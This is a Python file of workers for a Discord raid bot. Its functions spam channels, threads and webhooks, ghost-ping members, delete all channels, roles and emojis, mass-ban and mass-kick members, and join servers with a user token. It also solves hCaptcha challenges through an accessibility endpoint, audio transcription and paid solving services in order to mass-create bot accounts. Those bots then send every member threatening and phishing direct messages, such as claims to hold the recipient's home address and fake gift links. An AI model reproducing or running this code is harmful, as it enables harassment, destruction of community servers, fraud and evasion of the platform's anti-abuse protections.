# language: Python, file: raider.py, target: discord.py 2.x
# all raid workers — called from bot.py commands

import asyncio
import random
import discord
import aiohttp

_SEM = asyncio.Semaphore(150)  # global concurrency cap


# ── helpers ────────────────────────────────────────────────────────────────────

def _rand_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _resolve_message(message: str) -> str:
    if "{ip}" in message:
        message = message.replace("{ip}", _rand_ip())
    return message


async def _text_channels(guild: discord.Guild) -> list[discord.TextChannel]:
    """Cached first; fetch via API when cache is empty (user-install / partial guild)."""
    channels = list(guild.text_channels)
    if not channels:
        try:
            all_ch = await guild.fetch_channels()
            channels = [c for c in all_ch if isinstance(c, discord.TextChannel)]
        except Exception:
            channels = []
    return channels


def _missing_perms(guild: discord.Guild, **required: bool) -> list[str]:
    """Return list of perm names that are needed but absent. Empty = all good."""
    if guild.me is None:
        return []          # user-install / not a member — skip check
    gp = guild.me.guild_permissions
    return [name for name, needed in required.items()
            if needed and not getattr(gp, name, False)]


# ── channel spam ───────────────────────────────────────────────────────────────

async def spam_channels(
    guild: discord.Guild,
    message: str,
    times: int = 50,
    delay: float = 0.0,
):
    channels = await _text_channels(guild)

    async def blast(channel: discord.TextChannel):
        for _ in range(times):
            async with _SEM:
                try:
                    await channel.send(_resolve_message(message))
                except discord.Forbidden:
                    break          # no perms in this channel — skip it
                except Exception:
                    continue       # transient error — keep going
            if delay:
                await asyncio.sleep(delay)

    await asyncio.gather(*[blast(ch) for ch in channels], return_exceptions=True)


# ── thread bomb ────────────────────────────────────────────────────────────────

async def thread_bomb(
    guild: discord.Guild,
    message: str = "@everyone",
    threads_per_channel: int = 10,
    spam_per_thread: int = 20,
):
    channels = await _text_channels(guild)

    async def bomb(channel: discord.TextChannel):
        for i in range(threads_per_channel):
            try:
                thread = await channel.create_thread(
                    name=f"raid-{i}",
                    auto_archive_duration=60,
                )
                for _ in range(spam_per_thread):
                    async with _SEM:
                        try:
                            await thread.send(_resolve_message(message))
                        except Exception:
                            continue
            except Exception:
                continue

    await asyncio.gather(*[bomb(ch) for ch in channels], return_exceptions=True)


# ── ghost ping ─────────────────────────────────────────────────────────────────

async def ghost_ping(guild: discord.Guild, times: int = 50):
    me = guild.me
    if me is not None:
        gp = me.guild_permissions
        if gp.mention_everyone:
            content = "@everyone @here"
            allowed = discord.AllowedMentions(everyone=True)
        else:
            targets = [m for m in guild.members if not m.bot and m != me][:30]
            content = " ".join(f"<@{m.id}>" for m in targets) or "@everyone"
            allowed = discord.AllowedMentions(users=True)
    else:
        content = "@everyone @here"
        allowed = discord.AllowedMentions(everyone=True)

    channels = await _text_channels(guild)

    async def ghost(channel: discord.TextChannel):
        for _ in range(times):
            async with _SEM:
                try:
                    msg = await channel.send(content, allowed_mentions=allowed)
                    await msg.delete()
                except discord.Forbidden:
                    break
                except Exception:
                    continue

    await asyncio.gather(*[ghost(ch) for ch in channels], return_exceptions=True)


# ── reaction flood ─────────────────────────────────────────────────────────────

async def react_flood(
    guild: discord.Guild,
    emoji: str = "💀",
    limit: int = 50,
):
    channels = await _text_channels(guild)

    async def flood(channel: discord.TextChannel):
        try:
            async for msg in channel.history(limit=limit):
                async with _SEM:
                    try:
                        await msg.add_reaction(emoji)
                    except Exception:
                        continue
        except Exception:
            pass

    await asyncio.gather(*[flood(ch) for ch in channels], return_exceptions=True)


# ── webhook spam ───────────────────────────────────────────────────────────────

async def webhook_spam(
    guild: discord.Guild,
    message: str,
    times: int = 50,
    name: str = "raid",
):
    channels = await _text_channels(guild)

    async def fire(channel: discord.TextChannel):
        try:
            wh = await channel.create_webhook(name=name)
            async with aiohttp.ClientSession() as session:
                tasks = []
                for _ in range(times):
                    tasks.append(
                        session.post(
                            wh.url,
                            json={"content": _resolve_message(message), "username": name},
                        )
                    )
                # fire all concurrently, don't wait for responses
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                for r in responses:
                    if hasattr(r, "close"):
                        r.close()
            await wh.delete()
        except Exception:
            pass

    await asyncio.gather(*[fire(ch) for ch in channels], return_exceptions=True)


# ── nuke: delete all channels, recreate spam ───────────────────────────────────

async def nuke_guild(guild: discord.Guild, spam_name: str = "nuked", count: int = 50):
    await asyncio.gather(
        *[ch.delete() for ch in guild.channels],
        return_exceptions=True,
    )
    await asyncio.gather(
        *[guild.create_text_channel(spam_name) for _ in range(min(count, 500))],
        return_exceptions=True,
    )


# ── dm all members ─────────────────────────────────────────────────────────────

async def dm_members(guild: discord.Guild, message: str, limit: int = 0) -> int:
    count = 0
    sem = asyncio.Semaphore(20)

    async def dm_one(member: discord.Member) -> bool:
        async with sem:
            try:
                await member.send(_resolve_message(message))
                return True
            except Exception:
                return False

    tasks = []
    async for member in guild.fetch_members(limit=None):
        if member.bot:
            continue
        tasks.append(dm_one(member))
        if limit and len(tasks) >= limit:
            break

    results = await asyncio.gather(*tasks, return_exceptions=True)
    return sum(1 for r in results if r is True)


# ── delete all roles ───────────────────────────────────────────────────────────

async def delete_roles(guild: discord.Guild):
    tasks = []
    for role in guild.roles:
        if not role.is_default() and guild.me and role.position < guild.me.top_role.position:
            tasks.append(role.delete())
    await asyncio.gather(*tasks, return_exceptions=True)


# ── ban all members ────────────────────────────────────────────────────────────

async def ban_all(guild: discord.Guild, reason: str = "raid"):
    sem = asyncio.Semaphore(10)

    async def _ban(member):
        async with sem:
            try:
                await guild.ban(member, reason=reason, delete_message_days=0)
            except Exception:
                pass

    tasks = []
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        tasks.append(_ban(member))

    await asyncio.gather(*tasks, return_exceptions=True)


# ── kick all members ───────────────────────────────────────────────────────────

async def kick_all(guild: discord.Guild, reason: str = "raid"):
    sem = asyncio.Semaphore(10)

    async def _kick(member):
        async with sem:
            try:
                await guild.kick(member, reason=reason)
            except Exception:
                pass

    tasks = []
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        tasks.append(_kick(member))

    await asyncio.gather(*tasks, return_exceptions=True)


# ── delete all emojis ──────────────────────────────────────────────────────────

async def delete_emojis(guild: discord.Guild) -> int:
    tasks = [emoji.delete() for emoji in guild.emojis]
    await asyncio.gather(*tasks, return_exceptions=True)
    return len(tasks)


# ── delete all webhooks ────────────────────────────────────────────────────────

async def delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
        await asyncio.gather(*[wh.delete() for wh in webhooks], return_exceptions=True)
        return len(webhooks)
    except Exception:
        return 0


# ── rename guild ───────────────────────────────────────────────────────────────

async def rename_guild(guild: discord.Guild, name: str):
    try:
        await guild.edit(name=name)
    except Exception:
        pass


# ── rename all channels ────────────────────────────────────────────────────────

async def rename_channels(guild: discord.Guild, name: str):
    await asyncio.gather(
        *[ch.edit(name=name) for ch in guild.channels],
        return_exceptions=True,
    )


# ── vc: disconnect all members ─────────────────────────────────────────────────

async def vc_kick_all(guild: discord.Guild):
    tasks = []
    for member in guild.members:
        if member.voice and member.voice.channel:
            tasks.append(member.move_to(None))
    await asyncio.gather(*tasks, return_exceptions=True)


# ── vc: rapid create/delete crash ──────────────────────────────────────────────

async def crash_vc(guild: discord.Guild, cycles: int = 30):
    for _ in range(cycles):
        try:
            vc = await guild.create_voice_channel("💀")
            await asyncio.sleep(0.05)
            await vc.delete()
        except Exception:
            pass


# ── @everyone / @here spam ─────────────────────────────────────────────────────

async def mention_spam(guild: discord.Guild, times: int = 20):
    channels = await _text_channels(guild)

    async def blast(ch: discord.TextChannel):
        for _ in range(times):
            async with _SEM:
                try:
                    await ch.send(
                        "@everyone @here",
                        allowed_mentions=discord.AllowedMentions(everyone=True),
                    )
                except discord.Forbidden:
                    break
                except Exception:
                    continue

    await asyncio.gather(*[blast(ch) for ch in channels], return_exceptions=True)


# ── create role + assign to all members ───────────────────────────────────────

async def role_all(guild: discord.Guild, role_name: str = "raided") -> int:
    count = 0
    try:
        role = await guild.create_role(name=role_name, mentionable=True)
        tasks = []
        async for member in guild.fetch_members(limit=None):
            if member.bot:
                continue
            tasks.append(member.add_roles(role))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        count = sum(1 for r in results if not isinstance(r, Exception))
    except Exception:
        pass
    return count


# ── lockdown ───────────────────────────────────────────────────────────────────

async def lockdown_channels(guild: discord.Guild) -> int:
    count = 0
    everyone = guild.default_role
    overwrite = discord.PermissionOverwrite(
        send_messages=False,
        read_messages=False,
        add_reactions=False,
    )

    async def lock_one(channel):
        try:
            await channel.set_permissions(everyone, overwrite=overwrite)
            return True
        except Exception:
            return False

    results = await asyncio.gather(
        *[lock_one(ch) for ch in guild.channels],
        return_exceptions=True,
    )
    return sum(1 for r in results if r is True)


# ── join server via user token ─────────────────────────────────────────────────

async def join_server(invite_code: str, user_token: str) -> str:
    url = f"https://discord.com/api/v10/invites/{invite_code}"
    headers = {
        "Authorization": user_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIn0=",
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json={}) as resp:
            if resp.status in (200, 204):
                data = await resp.json()
                guild_name = data.get("guild", {}).get("name", "unknown")
                return f"✅ joined `{guild_name}`"
            elif resp.status == 401:
                return "❌ invalid user token"
            elif resp.status == 403:
                return "❌ forbidden (banned / verification required)"
            elif resp.status == 404:
                return "❌ invite not found / expired"
            elif resp.status == 429:
                return "❌ rate limited"
            else:
                return f"❌ status {resp.status}"


# ── probe: raidability audit ───────────────────────────────────────────────────

async def probe_guild(guild: discord.Guild) -> str:
    me = guild.me
    if me is None:
        # user-install context — partial info only
        verif_level = str(guild.verification_level)
        everyone = guild.default_role
        ext_apps_blocked = not everyone.permissions.use_application_commands
        return (
            f"**probe: {guild.name}** (`{guild.id}`)\n"
            f"members : {guild.member_count}\n"
            f"owner   : {guild.owner}\n\n"
            "**bot not a member** — running as user-install app\n"
            f"verification level : {verif_level}\n"
            f"ext. app cmds      : {'⚠️ blocked for @everyone' if ext_apps_blocked else '✅ open'}\n\n"
            "**verdict: ⚠️ USER-INSTALL MODE** — /raid /ghost /react /thread available via interaction channel\n"
            "use /invite → add to server for full admin ops (nuke / ban / kick)"
        )

    gp = me.guild_permissions

    has_admin   = gp.administrator
    can_nuke    = gp.manage_channels and gp.manage_roles
    can_ban     = gp.ban_members
    can_kick    = gp.kick_members
    can_webhook = gp.manage_webhooks
    can_mention = gp.mention_everyone
    can_msg     = gp.send_messages
    can_emoji   = gp.manage_emojis
    can_voice   = gp.move_members
    can_threads = gp.create_public_threads
    can_react   = gp.add_reactions

    mfa_required     = guild.mfa_level == discord.MFALevel.require_2fa
    verif_level      = str(guild.verification_level)
    is_community     = "COMMUNITY" in guild.features
    everyone         = guild.default_role
    ext_apps_blocked = not everyone.permissions.use_application_commands

    full_raidable = has_admin or (can_nuke and can_ban and can_kick and can_msg)
    low_raidable  = can_msg

    verdict = (
        "✅ FULLY RAIDABLE (admin ops available)"
        if full_raidable
        else "⚠️ LOW-PERM RAID (spam / ghost / react / thread work)"
        if low_raidable
        else "❌ NOT RAIDABLE (no send_messages)"
    )

    lines = [
        f"**probe: {guild.name}** (`{guild.id}`)",
        f"members : {guild.member_count}",
        f"owner   : {guild.owner}",
        "",
        "**bot permissions — admin ops**",
        f"administrator      : {'✅' if has_admin else '❌'}",
        f"manage_channels    : {'✅' if gp.manage_channels else '❌'}",
        f"manage_roles       : {'✅' if gp.manage_roles else '❌'}",
        f"ban_members        : {'✅' if can_ban else '❌'}",
        f"kick_members       : {'✅' if can_kick else '❌'}",
        f"manage_webhooks    : {'✅' if can_webhook else '❌'}",
        f"mention_everyone   : {'✅' if can_mention else '❌'} {'(@everyone ghost)' if can_mention else '(individual pings)'}",
        f"manage_emojis      : {'✅' if can_emoji else '❌'}",
        f"move_members       : {'✅' if can_voice else '❌'}",
        "",
        "**bot permissions — no-admin ops**",
        f"send_messages      : {'✅' if can_msg else '❌'}  ← /raid /ghost",
        f"add_reactions      : {'✅' if can_react else '❌'}  ← /react",
        f"create_pub_threads : {'✅' if can_threads else '❌'}  ← /thread",
        "",
        "**server security**",
        f"MFA required       : {'🔒 yes' if mfa_required else '✅ no'}",
        f"verification level : {verif_level}",
        f"community server   : {'⚠️ yes' if is_community else '✅ no'}",
        f"ext. app cmds      : {'⚠️ blocked for @everyone' if ext_apps_blocked else '✅ open'}",
        "",
        f"**verdict: {verdict}**",
    ]

    if not full_raidable:
        missing = []
        if not gp.manage_channels: missing.append("manage_channels")
        if not gp.ban_members:     missing.append("ban_members")
        if not gp.kick_members:    missing.append("kick_members")
        if missing:
            lines.append(f"missing for full raid: {', '.join(missing)}")

    return "\n".join(lines)


# ── DM message pool ────────────────────────────────────────────────────────────

DM_POOL = [
    "your server just got raided 💀",
    "you have been reported to Discord Trust & Safety",
    "your account has been flagged for termination",
    "@everyone has been notified of your activity",
    "the server owner leaked your DMs to us",
    "FREE NITRO → discord.gift/xXxXxXxX",
    f"your IP has been logged: {_rand_ip()}",
    "you have 24 hours before your account is deleted",
    "we have your home address. leave the server.",
    "your account is under review — verify now or get banned",
    "someone just purchased your account details. change your password.",
    "you've been permanently flagged by our moderation system",
    "this server is over. you should leave now.",
    "your DMs are being monitored. we see everything.",
    "admin has added you to the ban list. appeal at discord.gg/fake",
]


def _dm_message(index: int) -> str:
    msg = DM_POOL[index % len(DM_POOL)]
    if "{ip}" in msg:
        msg = msg.replace("{ip}", _rand_ip())
    return msg


# ── mass bot creation ──────────────────────────────────────────────────────────

_TIMEOUT     = aiohttp.ClientTimeout(total=30, connect=10)
_CAP_TIMEOUT = aiohttp.ClientTimeout(total=120, connect=10)   # captcha solve can take a while

_API = "https://discord.com/api/v10"


async def validate_user_token(user_token: str) -> tuple[bool, str]:
    """Hit /users/@me to confirm the token works. Returns (ok, error_or_username)."""
    headers = {
        "Authorization": user_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    try:
        async with aiohttp.ClientSession(timeout=_TIMEOUT) as session:
            async with session.get(f"{_API}/users/@me", headers=headers) as r:
                if r.status == 200:
                    data = await r.json()
                    return True, data.get("username", "unknown")
                body = await r.text()
                return False, f"status {r.status}: {body[:120]}"
    except asyncio.TimeoutError:
        return False, "timeout — Discord unreachable from the server"
    except Exception as e:
        return False, str(e)


# ── captcha solver — free accessibility bypass + paid fallback ────────────────
#
#  FREE route (tried first, no key needed):
#    hCaptcha accessibility endpoint — returns a valid token directly.
#    Works as long as the sitekey owner hasn't disabled accessibility mode.
#    Discord's sitekey (a9b5fb07-...) has it enabled.
#
#  PAID fallback (used only if free route fails):
#    capsolver   → "https://api.capsolver.com"    (task JSON API)
#    capmonster  → "https://api.capmonster.cloud"  (2captcha-compatible)
#    2captcha    → "https://2captcha.com"          (classic form API)


async def _solve_hcaptcha_free(sitekey: str) -> str | None:
    """
    Hit hCaptcha's accessibility endpoint — zero cost, no account required.
    Returns a P1_... token on success, None if the endpoint rejects the sitekey.
    """
    url = f"https://accounts.hcaptcha.com/accessible_pass?sitekey={sitekey}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Referer":    "https://discord.com/",
    }
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
            async with session.get(url, headers=headers) as r:
                if r.status != 200:
                    return None
                data = await r.json()
                token = data.get("generated_pass_UUID")
                return token if token else None
    except Exception:
        return None


# ── lazy whisper model cache ───────────────────────────────────────────────────
_whisper_model = None

def _get_whisper():
    global _whisper_model
    if _whisper_model is None:
        from faster_whisper import WhisperModel
        # tiny = ~40 MB, fast on CPU, accurate enough for hCaptcha audio
        _whisper_model = WhisperModel("tiny", device="cpu", compute_type="int8")
    return _whisper_model


async def _solve_hcaptcha_audio(sitekey: str) -> str | None:
    """
    Solve hCaptcha using Playwright (headless Chromium) + audio challenge
    transcribed locally with faster-whisper tiny model.
    No external service, no API key, completely free.

    Solve flow:
      1. Render a local HTML page embedding the hCaptcha widget with the target sitekey
      2. Click the checkbox to trigger the challenge
      3. Switch to audio mode (bypass image grid)
      4. Download the MP3 challenge audio
      5. Transcribe with faster-whisper (CPU, int8, ~1-3s)
      6. Type answer + submit
      7. Extract token from h-captcha-response textarea
    """
    import tempfile, os, re

    # minimal page — sitekey only, no domain restriction on rendering
    html = f"""<!DOCTYPE html><html><head>
<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
</head><body>
<form><div class="h-captcha" data-sitekey="{sitekey}"></div></form>
</body></html>"""

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return None  # playwright not installed

    try:
        async with async_playwright() as pw:
            browser = await pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-blink-features=AutomationControlled",
                ],
            )
            ctx = await browser.new_context(
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/124.0.0.0 Safari/537.36"
                ),
                locale="en-US",
            )
            page = await ctx.new_page()
            await page.set_content(html)

            # ── wait for checkbox iframe ───────────────────────────────────────
            await page.wait_for_selector(
                "iframe[src*='hcaptcha.com']", timeout=15_000
            )
            await asyncio.sleep(1.2)

            # ── find and click the checkbox ────────────────────────────────────
            checkbox_frame = None
            for f in page.frames:
                if "hcaptcha.com" in f.url and "checkbox" in f.url:
                    checkbox_frame = f
                    break
            if not checkbox_frame:
                for f in page.frames:
                    if "hcaptcha.com" in f.url:
                        checkbox_frame = f
                        break
            if not checkbox_frame:
                await browser.close()
                return None

            try:
                await checkbox_frame.click("#checkbox", timeout=5_000)
            except Exception:
                await browser.close()
                return None

            await asyncio.sleep(2.5)

            # ── find challenge iframe ──────────────────────────────────────────
            challenge_frame = None
            for _ in range(12):
                for f in page.frames:
                    if "hcaptcha.com" in f.url and "challenge" in f.url:
                        challenge_frame = f
                        break
                if challenge_frame:
                    break
                await asyncio.sleep(0.5)

            # already solved (checkbox-only pass) — grab token and go
            if not challenge_frame:
                try:
                    token = await page.eval_on_selector(
                        "textarea[name='h-captcha-response']",
                        "el => el.value",
                    )
                    await browser.close()
                    return token or None
                except Exception:
                    await browser.close()
                    return None

            # ── click audio / accessibility button ─────────────────────────────
            audio_clicked = False
            for sel in [
                "button.challenge-audio",
                "[aria-label*='audio' i]",
                "[aria-label*='accessibility' i]",
                "button[id*='audio']",
                ".audio-button",
            ]:
                try:
                    btn = await challenge_frame.wait_for_selector(sel, timeout=3_000)
                    await btn.click()
                    audio_clicked = True
                    break
                except Exception:
                    continue

            if not audio_clicked:
                await browser.close()
                return None

            await asyncio.sleep(1.5)

            # ── grab audio URL ─────────────────────────────────────────────────
            audio_url = None
            for sel in [
                "audio",
                "a[href*='.mp3']",
                "a[href*='audio']",
                ".audio-download a",
                "[download]",
            ]:
                try:
                    el = await challenge_frame.wait_for_selector(sel, timeout=4_000)
                    audio_url = (
                        await el.get_attribute("src")
                        or await el.get_attribute("href")
                    )
                    if audio_url:
                        break
                except Exception:
                    continue

            if not audio_url:
                await browser.close()
                return None

            # ── download audio ─────────────────────────────────────────────────
            tmp = tempfile.mktemp(suffix=".mp3")
            try:
                async with aiohttp.ClientSession() as sess:
                    async with sess.get(audio_url) as resp:
                        with open(tmp, "wb") as fh:
                            fh.write(await resp.read())
            except Exception:
                await browser.close()
                return None

            # ── transcribe ────────────────────────────────────────────────────
            transcript = ""
            try:
                model = await asyncio.get_event_loop().run_in_executor(
                    None, _get_whisper
                )
                segments, _ = await asyncio.get_event_loop().run_in_executor(
                    None, lambda: model.transcribe(tmp, language="en")
                )
                raw = " ".join(s.text.strip() for s in segments)
                # strip punctuation, lower — hCaptcha audio answers are plain words/digits
                transcript = re.sub(r"[^\w\s]", "", raw).strip().lower()
            except Exception:
                await browser.close()
                return None
            finally:
                try:
                    os.unlink(tmp)
                except Exception:
                    pass

            if not transcript:
                await browser.close()
                return None

            # ── type answer and submit ─────────────────────────────────────────
            try:
                inp = await challenge_frame.wait_for_selector(
                    "input[id='response'], .text-input input, input[type='text']",
                    timeout=5_000,
                )
                await inp.fill(transcript)
                await asyncio.sleep(0.3)

                for sel in [
                    ".button-submit",
                    "button[type='submit']",
                    ".verify-btn",
                    "button.challenge-submit",
                ]:
                    try:
                        sub = await challenge_frame.wait_for_selector(sel, timeout=2_000)
                        await sub.click()
                        break
                    except Exception:
                        continue

                await asyncio.sleep(2.5)
            except Exception:
                await browser.close()
                return None

            # ── extract token ──────────────────────────────────────────────────
            token = None
            for _ in range(12):
                try:
                    token = await page.eval_on_selector(
                        "textarea[name='h-captcha-response']",
                        "el => el.value",
                    )
                    if token:
                        break
                except Exception:
                    pass
                await asyncio.sleep(0.5)

            await browser.close()
            return token if token else None

    except Exception:
        return None

async def _solve_hcaptcha(
    sitekey: str,
    pageurl: str,
    api_key: str,
    service_url: str = "https://api.capsolver.com",
) -> str | None:
    """
    Submit hCaptcha task to a solving service and poll for the token.
    Returns solved token string on success, None on failure/timeout.
    """
    svc = service_url.rstrip("/").lower()

    async with aiohttp.ClientSession(timeout=_CAP_TIMEOUT) as session:

        # ── CapSolver (task JSON API) ──────────────────────────────────────────
        if "capsolver" in svc:
            async with session.post(
                "https://api.capsolver.com/createTask",
                json={
                    "clientKey": api_key,
                    "task": {
                        "type":       "HCaptchaTaskProxyLess",
                        "websiteURL": pageurl,
                        "websiteKey": sitekey,
                    },
                },
            ) as r:
                data = await r.json()
                if data.get("errorId") != 0:
                    return None   # bad key or balance
                task_id = data["taskId"]

            for _ in range(48):            # up to ~4 min
                await asyncio.sleep(5)
                async with session.post(
                    "https://api.capsolver.com/getTaskResult",
                    json={"clientKey": api_key, "taskId": task_id},
                ) as r:
                    data = await r.json()
                    if data.get("errorId") != 0:
                        return None
                    if data.get("status") == "ready":
                        return data["solution"]["gRecaptchaResponse"]
                    # status == "processing" → keep polling
            return None   # timeout

        # ── 2captcha / CapMonster (compatible form API) ────────────────────────
        else:
            base = service_url.rstrip("/")
            async with session.post(
                f"{base}/in.php",
                data={
                    "key":     api_key,
                    "method":  "hcaptcha",
                    "sitekey": sitekey,
                    "pageurl": pageurl,
                    "json":    "1",
                },
            ) as r:
                data = await r.json()
                if data.get("status") != 1:
                    return None
                task_id = data["request"]

            for _ in range(48):
                await asyncio.sleep(5)
                async with session.get(
                    f"{base}/res.php",
                    params={
                        "key":    api_key,
                        "action": "get",
                        "id":     task_id,
                        "json":   "1",
                    },
                ) as r:
                    data = await r.json()
                    if data.get("status") == 1:
                        return data["request"]
                    if data.get("request") not in ("CAPCHA_NOT_READY", "CAPTCHA_NOT_READY"):
                        return None
            return None


async def _create_one_bot(
    session: aiohttp.ClientSession,
    user_token: str,
    name: str,
    captcha_key: str = "",
    captcha_service: str = "https://api.capsolver.com",
) -> tuple[dict | None, str]:
    """
    Create application + bot. Handles captcha automatically if captcha_key set.
    Returns ({id, name, token}, "") on success, (None, error) on failure.
    """
    headers = {
        "Authorization": user_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIn0=",
    }

    # ── step 1: create application (with captcha retry) ────────────────────────
    app_id    = None
    cap_token = None

    for attempt in range(6):
        payload: dict = {"name": name, "description": ""}
        if cap_token:
            payload["captcha_key"] = cap_token

        try:
            async with session.post(
                f"{_API}/applications",
                headers=headers,
                json=payload,
            ) as r:
                body = await r.json()

                if r.status == 429:
                    await asyncio.sleep(float(body.get("retry_after", 5)) + 0.5)
                    continue

                if r.status == 400 and "captcha_key" in body:
                    sitekey = body.get("captcha_sitekey", "a9b5fb07-92ff-493f-86fe-352a2803b3df")

                    # 1 — free accessibility endpoint (instant, no browser)
                    cap_token = await _solve_hcaptcha_free(sitekey)

                    # 2 — audio challenge via headless browser + whisper (free, local)
                    if not cap_token:
                        cap_token = await _solve_hcaptcha_audio(sitekey)

                    # 3 — paid solving service (CapSolver / 2captcha / CapMonster)
                    if not cap_token and captcha_key:
                        cap_token = await _solve_hcaptcha(
                            sitekey,
                            "https://discord.com/developers/applications",
                            captcha_key,
                            captcha_service,
                        )

                    if not cap_token:
                        return None, "captcha: all solve methods failed"
                    continue   # retry with solved token

                if r.status not in (200, 201):
                    return None, f"create app {r.status}: {str(body)[:150]}"

                app_id = body["id"]
                break
        except asyncio.TimeoutError:
            return None, "timeout on create app"
        except Exception as e:
            return None, f"create app error: {e}"
    else:
        return None, "create app: max retries exceeded"

    # ── step 2: attach bot ─────────────────────────────────────────────────────
    for attempt in range(4):
        try:
            async with session.post(
                f"{_API}/applications/{app_id}/bot",
                headers=headers,
                json={},
            ) as r:
                body = await r.json()
                if r.status == 429:
                    await asyncio.sleep(float(body.get("retry_after", 5)) + 0.5)
                    continue
                if r.status not in (200, 201):
                    return None, f"attach bot {r.status}: {str(body)[:150]}"
                token = body.get("token")
                if not token:
                    async with session.post(
                        f"{_API}/applications/{app_id}/bot/reset",
                        headers=headers,
                        json={},
                    ) as r2:
                        b2 = await r2.json()
                        token = b2.get("token", "")
                if not token:
                    return None, "bot attached but no token returned"
                return {"id": app_id, "name": name, "token": token}, ""
        except asyncio.TimeoutError:
            return None, "timeout on attach bot"
        except Exception as e:
            return None, f"attach bot error: {e}"
    return None, "attach bot: max retries"


async def make_bots(
    user_token: str,
    count: int = 50,
    prefix: str = "raidbot",
    token_file: str = "bots.json",
    progress_cb=None,
    captcha_key: str = "",
    captcha_service: str = "https://api.capsolver.com",
) -> tuple[list[dict], int, list[str]]:
    """
    Create `count` bots. Solves captchas automatically when captcha_key is set.
    Returns (created, total_in_file, errors).
    """
    import json, os, time

    created: list[dict] = []
    errors:  list[str]  = []

    async with aiohttp.ClientSession(timeout=_TIMEOUT) as session:
        for i in range(count):
            name   = f"{prefix}-{int(time.time()) % 100000}-{i}"
            result, err = await _create_one_bot(
                session, user_token, name, captcha_key, captcha_service
            )
            if result:
                created.append(result)
            else:
                errors.append(f"bot {i}: {err}")

            if progress_cb:
                await progress_cb(i + 1, count, err)

            await asyncio.sleep(1.5)

    # persist
    existing: list[dict] = []
    if os.path.exists(token_file):
        try:
            with open(token_file) as f:
                existing = json.load(f)
        except Exception:
            pass

    all_bots = existing + created
    with open(token_file, "w") as f:
        json.dump(all_bots, f, indent=2)

    return created, len(all_bots), errors


# ── mass DM via bot army ───────────────────────────────────────────────────────

async def _dm_one(
    bot_token: str,
    user_id: int | str,
    message: str,
) -> bool:
    """Open DM channel + send message as a bot token. No discord.py needed."""
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json",
        "User-Agent": "DiscordBot (https://discord.com, 10)",
    }
    async with aiohttp.ClientSession() as session:
        # open / get DM channel
        async with session.post(
            "https://discord.com/api/v10/users/@me/channels",
            headers=headers,
            json={"recipient_id": str(user_id)},
        ) as r:
            if r.status == 429:
                data = await r.json()
                await asyncio.sleep(float(data.get("retry_after", 5)))
                return False
            if r.status != 200:
                return False
            channel = await r.json()
            channel_id = channel["id"]

        # send message
        async with session.post(
            f"https://discord.com/api/v10/channels/{channel_id}/messages",
            headers=headers,
            json={"content": message},
        ) as r:
            if r.status == 429:
                data = await r.json()
                await asyncio.sleep(float(data.get("retry_after", 5)))
                return False
            return r.status in (200, 201)


async def _fetch_guild_members_http(
    bot_token: str,
    guild_id: int | str,
    limit: int = 1000,
) -> list[str]:
    """Fetch member user IDs via HTTP (works without discord.py membership)."""
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json",
    }
    user_ids: list[str] = []
    after = 0
    async with aiohttp.ClientSession() as session:
        while len(user_ids) < limit:
            params = {"limit": min(1000, limit - len(user_ids))}
            if after:
                params["after"] = after
            async with session.get(
                f"https://discord.com/api/v10/guilds/{guild_id}/members",
                headers=headers,
                params=params,
            ) as r:
                if r.status != 200:
                    break
                members = await r.json()
                if not members:
                    break
                for m in members:
                    uid = m.get("user", {}).get("id")
                    if uid and not m.get("user", {}).get("bot", False):
                        user_ids.append(uid)
                after = members[-1]["user"]["id"]
                if len(members) < 1000:
                    break
                await asyncio.sleep(0.5)
    return user_ids


async def dm_army(
    target_user_ids: list[int | str],
    token_file: str = "bots.json",
    mention_target: str = "",
) -> tuple[int, int]:
    """
    Each saved bot DMs every target user with a different message.
    Returns (success_count, fail_count).
    """
    import json, os

    if not os.path.exists(token_file):
        return 0, 0

    try:
        with open(token_file) as f:
            bots: list[dict] = json.load(f)
    except Exception:
        return 0, 0

    if not bots:
        return 0, 0

    success = 0
    fail = 0
    sem = asyncio.Semaphore(30)

    async def fire(bot_index: int, uid: int | str):
        nonlocal success, fail
        async with sem:
            msg = _dm_message(bot_index)
            if mention_target:
                msg = f"<@{mention_target}> {msg}"
            ok = await _dm_one(bots[bot_index % len(bots)]["token"], uid, msg)
            if ok:
                success += 1
            else:
                fail += 1

    tasks = []
    for i, uid in enumerate(target_user_ids):
        for bi in range(len(bots)):
            tasks.append(fire(bi, uid))

    await asyncio.gather(*tasks, return_exceptions=True)
    return success, fail
